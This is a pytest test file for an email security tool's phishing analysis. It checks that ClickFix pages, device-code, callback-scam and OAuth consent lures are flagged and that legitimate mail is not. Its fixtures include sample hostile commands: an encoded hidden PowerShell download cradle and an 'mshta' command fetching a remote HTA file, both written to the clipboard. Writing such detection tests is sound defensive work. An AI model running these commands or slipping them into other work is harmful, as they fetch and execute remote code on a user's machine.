"""End-to-end (parse -> analyze) checks for the lure catalog, plus the
click-advice and links summary on the November 2026 false-positive corpus.

The real-browser behaviour is covered in tests/integration/chamber; here the
sandbox is a FakeDetonator returning what the chamber records for each page.
"""

from __future__ import annotations

from datetime import UTC, datetime

import pytest

from reddysec.analysis import analyze, parse_raw
from reddysec.analysis.intel import OfflineIntel
from reddysec.analysis.pipeline import AnalysisContext
from reddysec.models import (
    ClientFeedback,
    DetonationJob,
    DetonationResult,
    DetonationStatus,
    DownloadRecord,
    FormRecord,
    PageFeatures,
    PolicyConfig,
    RedirectHop,
    VerdictLevel,
)
from reddysec.testing.fakes import FakeDetonator

from .corpus import static_message

RECEIVED_AT = datetime(2026, 11, 6, 15, 0, tzinfo=UTC)
ALIGNED = "mx.google.com; dkim=pass header.i=@{d}; spf=pass smtp.mailfrom={d}; dmarc=pass header.from={d}"
ENC = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"


def raw_message(*, sender: str, subject: str, text: str = "", auth_domain: str | None = None, html: str | None = None) -> bytes:
    headers = [f"From: {sender}", "To: client@gmail.com", f"Subject: {subject}", "Date: Fri, 06 Nov 2026 07:00:00 -0800",
               "Message-ID: <lure-1@example.com>", "MIME-Version: 1.0"]
    if auth_domain:
        headers.append("Authentication-Results: " + ALIGNED.format(d=auth_domain))
    if html is not None:
        headers.append('Content-Type: text/html; charset="utf-8"')
        body = html
    else:
        headers.append('Content-Type: text/plain; charset="utf-8"')
        body = text
    return ("\r\n".join(headers) + "\r\n\r\n" + body).encode()


def parse(raw: bytes, pid: str = "lure"):
    return parse_raw(raw, provider_message_id=pid, mailbox_id="mbx", received_at=RECEIVED_AT)


def ctx(det=None, feedback=None):
    return AnalysisContext(policy=PolicyConfig(), history=None, intel=OfflineIntel(), detonator=det or FakeDetonator(),
                           feedback=feedback)


def clickfix_page(job: DetonationJob) -> DetonationResult:
    return DetonationResult(
        job_id=job.job_id, status=DetonationStatus.OK,
        features=PageFeatures(
            title="reCAPTCHA", final_url=job.url, final_host="docs-portal.example", status_code=200,
            text_excerpt="I'm not a robot\nVerification Steps\nPress Windows Button + R\nPress CTRL + V\nPress Enter",
            clipboard_writes=[f"powershell -w hidden -enc {ENC} # I am not a robot - reCAPTCHA Verification ID: 4821"],
            lure_clicks=["recaptcha-anchor"], captcha_detected=True,
        ),
    )


def codes(v) -> dict[str, int]:
    out: dict[str, int] = {}
    for s in v.signals:
        out[s.code] = max(out.get(s.code, s.weight), s.weight)
    return out


class TestClickFixEndToEnd:
    async def test_clickfix_link_is_quarantined_with_do_not_open(self):
        p = parse(raw_message(sender="Accounts <billing@docs-portal.example>", subject="Invoice ready",
                              text="Your invoice is ready: https://docs-portal.example/view/88"))
        det = FakeDetonator()
        det.script("https://docs-portal.example/view/88", clickfix_page)
        v = await analyze(p, ctx(det))
        assert v.level is VerdictLevel.MALICIOUS and codes(v)["dynamic.clickfix"] == 100
        link = v.urls[0]
        assert link.click_advice == "do_not_open" and "paste a command" in link.click_advice_reason
        assert v.links_summary == "Links: 1 do not open"
        assert "paste a command" in v.summary

    async def test_trusted_sender_cannot_override_clickfix(self):
        """A hacked vendor account the client marked safe sends a ClickFix link."""
        p = parse(raw_message(sender="Vendor <ap@vendor-co.example>", subject="Updated statement",
                              text="Statement: https://docs-portal.example/view/88", auth_domain="vendor-co.example"))
        det = FakeDetonator()
        det.script("https://docs-portal.example/view/88", clickfix_page)
        feedback = ClientFeedback(trusted_domains=["vendor-co.example"])
        v = await analyze(p, ctx(det, feedback))
        assert det.jobs, "trust never skips the sandbox"
        assert codes(v)["dynamic.clickfix"] == 100
        assert v.level is VerdictLevel.MALICIOUS
        assert v.trust_check is not None and v.trust_check.outcome == "changed"
        trusted = next(s for s in v.signals if s.code == "history.client_trusted")
        assert trusted.weight == 0  # trust withheld because of the serious finding

    async def test_html_attachment_clickfix(self):
        html = (b"<html><body><h2>I'm not a robot</h2><p>Press Windows + R, then CTRL + V, then Enter</p>"
                b"<script>navigator.clipboard.writeText('mshta https://x.example/a.hta')</script></body></html>")
        import base64

        raw = (
            "From: Scanner <scan@office-mfp.example>\r\nTo: client@gmail.com\r\nSubject: Scan\r\n"
            "Date: Fri, 06 Nov 2026 07:00:00 -0800\r\nMessage-ID: <s@x>\r\nMIME-Version: 1.0\r\n"
            'Content-Type: multipart/mixed; boundary="B"\r\n\r\n--B\r\nContent-Type: text/plain\r\n\r\nSee attached.\r\n'
            '--B\r\nContent-Type: text/html; name="Scan_0042.html"\r\nContent-Disposition: attachment; filename="Scan_0042.html"\r\n'
            "Content-Transfer-Encoding: base64\r\n\r\n" + base64.encodebytes(html).decode() + "--B--\r\n"
        ).encode()
        v = await analyze(parse(raw), ctx())
        assert codes(v)["attachment.html_clickfix"] == 90 and v.level is VerdictLevel.MALICIOUS


class TestEmailLures:
    async def test_device_code_email_blocks_every_link(self):
        p = parse(raw_message(sender="Board Office <office@board-meetings.example>", subject="Secure Teams meeting",
                              text="Join here: https://www.microsoft.com/en-us/microsoft-teams and when asked go to "
                                   "https://microsoft.com/devicelogin and enter code GHK7PQ2XA."))
        v = await analyze(p, ctx())
        assert codes(v)["bec.device_code_lure"] == 70
        assert v.level in (VerdictLevel.SUSPICIOUS, VerdictLevel.MALICIOUS)
        assert v.urls and all(u.click_advice == "do_not_open" for u in v.urls)

    async def test_callback_scam_from_freemail(self):
        p = parse(raw_message(sender="Geek Squad Billing <geeksquad.billing@gmail.com>", subject="Auto-renewal confirmation",
                              text="Your membership has been renewed and $399.99 has been charged. Invoice number GS-1182. "
                                   "If you did not authorize this, call +1 (808) 555-0142 to cancel and get a refund."))
        v = await analyze(p, ctx())
        assert codes(v)["bec.callback_scam"] == 55
        assert v.level in (VerdictLevel.SUSPICIOUS, VerdictLevel.MALICIOUS)

    async def test_oauth_consent_link(self):
        link = ("https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=8a1f&response_type=code"
                "&scope=offline_access%20Mail.ReadWrite%20Mail.Send&redirect_uri=https://doc-viewer.example/cb")
        p = parse(raw_message(sender="DocuShare <share@doc-viewer.example>", subject="Shared file",
                              html=f'<p>A file was shared with you.</p><a href="{link}">Open document</a>'))
        v = await analyze(p, ctx())
        assert codes(v)["url.oauth_consent_lure"] == 50
        assert v.urls[0].click_advice == "do_not_open"

    async def test_open_redirect_chain_is_shown(self):
        p = parse(raw_message(sender="HR <hr@payroll-notice.example>", subject="Policy",
                              html='<a href="https://www.google.com/url?q=https://hr-portal.example/policy&amp;sa=D">Policy</a>'))
        det = FakeDetonator()
        det.script("https://hr-portal.example/policy", lambda job: DetonationResult(
            job_id=job.job_id, status=DetonationStatus.OK,
            redirects=[RedirectHop(url="https://hr-portal.example/policy"), RedirectHop(url="https://hr-portal2.example/x")],
            features=PageFeatures(title="Policy", final_url="https://hr-portal2.example/x", final_host="hr-portal2.example"),
        ))
        v = await analyze(p, ctx(det))
        link = v.urls[0]
        assert link.url == "https://hr-portal.example/policy" and codes(v)["url.open_redirect"] == 20
        assert link.redirect_chain[0].startswith("https://www.google.com/url")
        assert link.redirect_chain[-1] == "https://hr-portal2.example/x"
        assert link.click_advice == "open_in_reading_room"

    async def test_download_summary_on_link(self):
        p = parse(raw_message(sender="Shipping <track@parcel-status.example>", subject="Label",
                              text="Print your label: https://parcel-status.example/label"))
        det = FakeDetonator()
        det.script("https://parcel-status.example/label", lambda job: DetonationResult(
            job_id=job.job_id, status=DetonationStatus.OK,
            features=PageFeatures(final_url=job.url, final_host="parcel-status.example"),
            downloads=[DownloadRecord(suggested_filename="Label.zip", sha256="b" * 64, size=900, sniffed_type="zip",
                                      archive_entries=["Label.pdf.lnk"])],
        ))
        v = await analyze(p, ctx(det))
        link = v.urls[0]
        assert link.click_advice == "do_not_open" and link.downloads_summary[0].dangerous
        assert "Label.pdf.lnk" in link.downloads_summary[0].why


def _corpus(name):
    return parse(static_message(name), name)


class TestCorpusClickAdvice:
    @pytest.mark.parametrize(
        "name",
        ["17_retail_order_gift_card_mention", "18_retail_promo_shop_gift_cards", "19_nonprofit_partner_links",
         "21_google_family_digest", "03_legit_docusign", "02_newsletter_with_tracking"],
    )
    async def test_real_mail_never_says_do_not_open(self, name):
        v = await analyze(_corpus(name), ctx())
        assert v.level is VerdictLevel.SAFE
        assert all(u.click_advice in {"safe_to_open", "open_in_reading_room"} for u in v.urls), [
            (u.url, u.click_advice, u.click_advice_reason) for u in v.urls]
        assert not {"dynamic.clickfix", "dynamic.fake_captcha", "bec.device_code_lure", "bec.callback_scam",
                    "url.oauth_consent_lure"} & set(codes(v))
        if v.urls:
            assert v.links_summary.startswith("Links: ")

    async def test_retailer_links_on_own_verified_domain_are_safe(self):
        v = await analyze(_corpus("17_retail_order_gift_card_mention"), ctx())
        assert any(u.click_advice == "safe_to_open" for u in v.urls), [(u.url, u.click_advice_reason) for u in v.urls]

    async def test_fake_docusign_link_is_do_not_open(self):
        det = FakeDetonator()
        p = _corpus("04_fake_docusign_lookalike")
        for u in p.urls:
            det.script(u.normalized, lambda job: DetonationResult(
                job_id=job.job_id, status=DetonationStatus.OK,
                features=PageFeatures(title="DocuSign - Sign in", final_url=job.url, final_host="docusign-secure.example",
                                      has_password_field=True, forms=[FormRecord(has_password=True)],
                                      brand_keywords=["docusign"]),
            ))
        v = await analyze(p, ctx(det))
        assert v.level is VerdictLevel.MALICIOUS
        assert any(u.click_advice == "do_not_open" for u in v.urls)
